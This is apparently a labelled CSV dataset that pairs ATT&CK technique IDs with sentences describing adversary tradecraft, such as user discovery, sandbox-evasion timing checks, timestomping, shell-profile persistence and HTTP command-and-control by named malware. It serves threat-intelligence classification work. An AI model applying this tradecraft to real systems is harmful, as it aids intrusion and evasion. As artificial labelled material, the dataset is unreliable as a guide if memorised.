label_tec,sentence
T1033,SLOTHFULMEDIA has collected the username from a victim machine.
T1033,Egregor has used tools to gather information about users.
T1033,SideTwist can collect the username on a targeted system.
T1033,Metamorfo has collected the username from the victim's machine.
T1033,"An APT3 downloader uses the Windows command ""cmd.exe"" /C whoami to verify that it is running with the elevated privileges of “System.” A Gamaredon Group file stealer can gather the victim's username to send to a C2 server."
T1033,Dragonfly 2.0 used the command query user on victim hosts.
T1033,APT39 used Remexi to collect usernames from the system.
T1033,"Operation Wocao has enumerated sessions and users on a remote host, and identified privileged users logged into a targeted system."
T1033,ZIRCONIUM has used a tool to capture the username on a compromised host in order to register it with C2.
T1033,"APT38 has identified primary users, currently logged in users, sets of users that commonly use a system, or inactive users."
T1007,Epic uses the tasklist /svc command to list the services on the system.
T1007,BBSRAT can query service configuration information.
T1007,Sykipot may use net start to display running services.
T1007,ZLib has the ability to discover and manipulate Windows services.
T1007,InvisiMole can obtain running services on the victim.
T1007,Ursnif has gathered information about running services.
T1007,HotCroissant has the ability to retrieve a list of services on the infected host.
T1007,Caterpillar WebShell can obtain a list of the services from a system.
T1007,Turla surveys a system upon check-in to discover running services and associated processes using the tasklist /svc command.
T1007,Indrik Spider has used the win32_service WMI class to retrieve a list of services from the system.
T1569,Adversaries may abuse system services or daemons to execute commands or programs.
T1569,Adversaries can execute malicious content by interacting with or creating services either locally or remotely.
T1569,"Many services are set to run at boot, which can aid in achieving persistence , but adversaries can also abuse services for one-time or temporary execution."
T1529,Operating systems may contain commands to initiate a shutdown/reboot of a machine.
T1529,LockerGoga has been observed shutting down infected systems.
T1529,KillDisk attempts to reboot the machine by terminating specific processes.
T1124,"As part of the data reconnaissance phase, Proxysvc grabs the system time to send back to the control server."
T1124,Agent Tesla can collect the timestamp from the victim’s machine.
T1124,"PowerDuke has commands to get the time the machine was built, the time, and the time zone."
T1124,HOPLIGHT has been observed collecting system time from victim machines.
T1124,StoneDrill can obtain the current date and time of the victim machine.
T1124,"EvilBunny has used the API calls NtQuerySystemTime, GetSystemTimeAsFileTime, and GetTickCount to gather time metrics as part of its checks to see if the malware is running in a sandbox."
T1124,GRIFFON has used a reconnaissance module that can be used to retrieve the date and time of the system.
T1124,build_downer has the ability to determine the local time to ensure malware installation only happens during the hours that the infected system is active.
T1124,Stuxnet collects the time and date of a system when it is infected.
T1124,Operation Wocao has used the time command to retrieve the current time of a compromised system.
T1124,Chimera has used time /t and net time \\ip/hostname for system time discovery.
T1124,Sidewinder has used tools to obtain the current system time.
T1124,ZIRCONIUM has used a tool to capture the time on a compromised host in order to register it with C2.
T1543,Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence.
T1543,The systemd service manager is commonly used for managing background daemon processes  and other system resources.
T1543,"While adversaries typically require root privileges to create/modify service unit files in the /etc/systemd/system and /usr/lib/systemd/system directories, low privilege users can create/modify service unit files in directories such as ~/.config/systemd/user/ to achieve user-level persistence."
T1543,Exaramel for Linux has a hardcoded location under systemd that it uses to achieve persistence if it is running as root.
T1543,TeamTNT has established persistence through the creation of a cryptocurrency mining system service.
T1053,Timers can be set to run on a calendar event or after a time span relative to a starting point.
T1053,"Systemd timers may be activated remotely via the systemctl command line utility, which operates over SSH."
T1053,"Each .timer file must have a corresponding .service file with the same name, e.g., example.timer and example.service."
T1080,"Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories."
T1080,"Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system."
T1080,Adversaries may use tainted shared content to move laterally.
T1080,Gamaredon Group has injected malicious macros into all Word and Excel documents on mapped network drives.
T1221,Microsoft’s Office Open XML  specification defines an XML-based format for Office documents  to replace older binary formats .
T1221,Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.
T1221,Chaes changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload.
T1221,Dragonfly 2.0 has injected SMB URLs into malicious Word spearphishing attachments to initiate Forced Authentication.
T1055,Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process.
T1597,Adversaries may search private data from threat intelligence vendors for information that can be used during targeting.
T1597,Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported.
T1497,Delays may also be based on waiting for specific victim conditions to be met  or employ scheduled Multi-Stage Channels to avoid analysis and scrutiny.
T1497,"For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function."
T1497,Bazar can use a timer to delay execution of core functionality.
T1497,BendyBear can check for analysis environments and signs of debugging using the Windows API kernel32!GetTickCountKernel32 call.
T1497,"ThiefQuest invokes time call to check the system's time, executes a sleep command, invokes a second time call, and then compares the time difference between the two time calls and the amount of time the system slept to identify the sandbox."
T1497,EvilBunny has used time measurements from 3 different APIs before and after performing sleep operations to check and abort if the malware is running in a sandbox.
T1497,"SodaMaster has the ability to put itself to ""sleep"" for a specified time."
T1497,Clop has used the sleep command to avoid sandbox detection.
T1497,Lokibot has performed a time-based anti-debug check before downloading its third stage.
T1497,"Using the machine's local time, XCSSET waits 43200 seconds  from the initial creation timestamp of a specific file, .report."
T1497,"After the elapsed time, XCSSET executes additional modules."
T1547,Time providers are implemented as dynamic-link libraries  that are registered in the subkeys of  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\.
T1547,"Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account."
T1070,"Timestomping is a technique that modifies the timestamps of a file , often to mimic files that are in the same folder."
T1070,InvisiMole samples were timestomped by the authors by setting the PE timestamps to all zero values.
T1070,BLINDINGCAN has modified file and directory timestamps.
T1070,OSX_OCEANLOTUS.D can use the touch -t command to change timestamps.
T1070,EVILNUM has changed the creation date of files.
T1070,BitPaymer can modify the timestamp of an executable so that it can be identified and restored by the decryption tool.
T1070,Cobalt Strike will timestomp any files or payloads placed on a target machine to help them blend in.
T1070,APT29 modified timestamps of backdoors to match legitimate Windows files.
T1134,"For example, this may be useful for when the target user has a non-network logon session on the system."
T1134,"Shamoon can impersonate tokens using LogonUser, ImpersonateLoggedOnUser, and ImpersonateNamedPipeClient."
T1588,"Commercial software may be obtained through purchase, stealing licenses , or cracking trial versions."
T1588,"In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities ."
T1588,Sandworm Team has acquired open-source tools for some of it's operations; for example it acquired Invoke-PSImage to establish an encrypted channel from a compromised host to Sandworm Team's C2 server as part of its preparation for the 2018 Winter Olympics attack.
T1588,APT39 has modified and used customized versions of publicly-available tools like PLINK and Mimikatz.
T1588,"APT28 has obtained and used open-source tools like Koadic, Mimikatz, and Responder."
T1588,IndigoZebra has acquired open source tools such as NBTscan and Meterpreter for their operations.
T1588,"DarkHydrus has obtained and used tools such as Mimikatz, Empire, and Cobalt Strike."
T1588,Ke3chang has obtained and used tools such as Mimikatz.
T1588,Thrip has obtained and used tools such as Mimikatz and PsExec.
T1588,"Cobalt Group has obtained and used a variety of tools including Mimikatz, PsExec, Cobalt Strike, and SDelete."
T1588,Whitefly has obtained and used tools such as Mimikatz.
T1588,"FIN5 has obtained and used a customized version of PsExec, as well as use other tools such as pwdump, SDelete, and Windows Credential Editor."
T1588,"DarkVishnya has obtained and used tools such as Impacket, Winexe, and PsExec."
T1020,Malicious modifications to network devices to enable traffic redirection may be possible through ROMMONkit or Patch System Image.
T1205,This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control.
T1205,"Usually this series of packets consists of attempted connections to a predefined sequence of closed ports  Port Knocking, but can involve unusual flags, specific strings, or other unique characteristics."
T1205,"Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it."
T1205,"Winnti for Linux has used a passive listener, capable of identifying a specific magic value before executing tasking, as a secondary command and control  mechanism."
T1537,"Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection."
T1565,"LightNeuron is capable of modifying email content, headers, and attachments during transit."
T1565,"Metamorfo has a function that can watch the contents of the system clipboard for valid bitcoin addresses, which it then overwrites with the attacker's address."
T1565,Melcoz can monitor the clipboard for cryptocurrency addresses and change the intended address to one controlled by the adversary.
T1505,"Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria."
T1546,A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.
T1546,Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism.
T1127,"There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering."
T1199,Adversaries may breach or otherwise leverage organizations who have access to intended victims.
T1199,Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments.
T1111,Capturing token input  may provide temporary access  replay the one-time passcode until the next value rollover as well as possibly enabling adversaries to reliably predict future authentication values .
T1111,It is common for one-time codes to be sent via out-of-band communications .
T1111,"Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors."
T1059,Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops.
T1059,Kazuar uses /bin/bash to execute commands on the victim’s machine.
T1059,Proton uses macOS' .command file type to script actions.
T1059,CoinTicker executes a bash script to establish a reverse shell.
T1059,Exaramel for Linux has a command to execute a shell command on the system.
T1059,Skidmap has used pm.sh to download and install its main payload.
T1059,NETWIRE has the ability to use /bin/bash and /bin/sh to execute commands.
T1059,Penquin can execute remote commands using bash scripts.
T1059,Doki has executed shell scripts with /bin/sh.
T1059,Turian has the ability to use /bin/sh to execute commands.
T1546,User Unix Shells execute several configuration scripts at different points throughout the session based on events.
T1546,"Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files."
T1546,"For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely."
T1546,"For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+."
T1546,"For legacy programs, macOS executes /etc/bashrc on startup."
T1552,Adversaries may search compromised systems to find and obtain insecurely stored credentials.
T1535,"Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements."
T1535,"An example of adversary use of unused AWS regions is to mine cryptocurrency through Resource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used."
T1608,Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting.
T1608,"By chance encounter, victims may directly download/install these backdoored files via User Execution."
T1608,"APT32 has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting."
T1608,"Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server."
T1204,"Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link."
T1204,These user actions will typically be observed as follow-on behavior from forms of Phishing.
T1204,"While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it."
T1564,MS Office documents with embedded VBA content store source code inside of module streams.
T1021,Adversaries may use Valid Accounts to remotely control machines using Virtual Network Computing .
T1021,VNC differs from Remote Desktop Protocol as VNC is screen-sharing software rather than resource-sharing software.
T1021,Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.
T1021,Fox Kitten has installed TightVNC server and client on compromised servers and endpoints for lateral movement.
T1021,FIN7 has used TightVNC to control compromised hosts.
T1078,"The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access , domain or enterprise administrator to bypass access controls set within the enterprise."
T1078,Linux Rabbit acquires valid SSH accounts through brute force.
T1078,Dtrack used hard-coded credentials to gain access to a network share.
T1078,GALLIUM leveraged valid accounts to maintain access to a victim network.
T1078,Fox Kitten has used valid credentials with various services during lateral movement.
T1078,UNC2452 used different compromised credentials for remote access and to move laterally.
T1218,Adversaries may abuse verclsid.exe to proxy execution of malicious code.
T1218,Adversaries may abuse verclsid.exe to execute malicious payloads.
T1218,"COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets  from remote servers ."
T1125,DarkComet can access the victim’s webcam to take pictures.
T1125,NanoCore can access the victim's webcam and capture data.
T1125,Agent Tesla can access the victim’s webcam and record video.
T1125,njRAT can access the victim's webcam.
T1125,ZxShell has a command to perform video device spying.
T1583,"Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure."
T1584,Adversaries may compromise VPSs purchased by third-party entities.
T1497,Some versions of CozyCar will check to ensure it is not being executed inside a virtual machine or a known malware analysis sandbox environment.
T1059,Adversaries may use VB payloads to execute malicious commands.
T1059,NanHaiShu executes additional VBScript code on the victim's machine.
T1059,OSX_OCEANLOTUS.D uses Word macros for execution.
T1059,Emotet has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads.
T1059,Comnie executes VBS scripts.
T1059,PoetRAT has used Word documents with VBScripts to execute malicious activities.
T1059,VBShower has the ability to execute VBScript files.
T1059,Ramsay has included embedded Visual Basic scripts in malicious documents.
T1059,Sibot executes commands using VBScript.
T1059,Leviathan has used VBScript.
T1059,FIN4 has used VBA macros to display a dialog box and collect victim credentials.
T1059,TA505 has used VBS for code execution.
T1059,"MuddyWater has used VBScript files to execute its POWERSTATS payload, as well as macros."
T1059,"Molerats used various implants, including those built with VBScript, on target machines."
T1059,Sharpshooter's first-stage downloader was a VBA macro.
T1059,Higaisa has used VBScript code on the victim's machine.
T1059,Windshift has used Visual Basic 6  payloads.
T1059,APT38 has used VBScript to execute commands and other operational tasks.
T1588,There is usually a delay between when a vulnerability is discovered and when it is made public.
T1595,"Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts."
T1596,WHOIS data is stored by regional Internet registries  responsible for allocating and assigning Internet resources such as domain names.
T1596,Adversaries may search WHOIS data to gather actionable information.
T1600,Adversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications.
T1600,"This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts."
T1606,Adversaries may generate these cookies in order to gain access to web resources.
T1606,"Once forged, adversaries may use these web cookies to access resources , which may bypass multi-factor and other authentication protection mechanisms."
T1071,Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.
T1071,BADNEWS establishes a backdoor over HTTP.
T1071,BBSRAT uses GET and POST requests over HTTP or HTTPS for command and control to obtain commands and send ZLIB compressed data back to the C2 server.
T1071,Psylo uses HTTPS for C2.
T1071,GravityRAT uses HTTP for C2.
T1071,Seasalt uses HTTP for C2 communications.
T1071,Daserf uses HTTP for C2.
T1071,Remsec is capable of using HTTP and HTTPS for C2.
T1071,ChChes communicates to its C2 server over HTTP and embeds data within the Cookie HTTP header.
T1071,The Komplex C2 channel uses HTTP POST requests.
T1071,DarkComet can use HTTP for C2 communications.
T1071,NETEAGLE will also use HTTP to download resources that contain an IP address and Port Number pair to connect to for further C2.
T1071,LOWBALL command and control occurs via HTTPS over port 443.
T1071,Epic uses HTTP and HTTPS for C2 communications.
T1071,Bankshot uses HTTP for command and control communication.
T1071,China Chopper's server component executes code sent via HTTP POST commands.
T1071,"UPPERCUT has used HTTP for C2, including sending error codes in Cookie headers."
T1071,One variant of CloudDuke uses HTTP and HTTPS for C2.
T1071,OLDBAIT can use HTTP for C2.
T1071,Final1stspy uses HTTP for C2.
T1071,Hi-Zor communicates with its C2 server over HTTPS.
T1071,BUBBLEWRAP can communicate using HTTP or HTTPS.
T1071,HyperBro has used HTTPS for C2 communications.
T1071,Machete uses HTTP for Command & Control.
T1071,Okrum uses HTTP for communication with its C2.
T1071,BBK has the ability to use HTTP in communications with C2.
T1071,BackConfig has the ability to use HTTPS for C2 communiations.
T1071,Valak has used HTTP in communications with C2.
T1071,Dacls can use HTTPS in C2 communications.
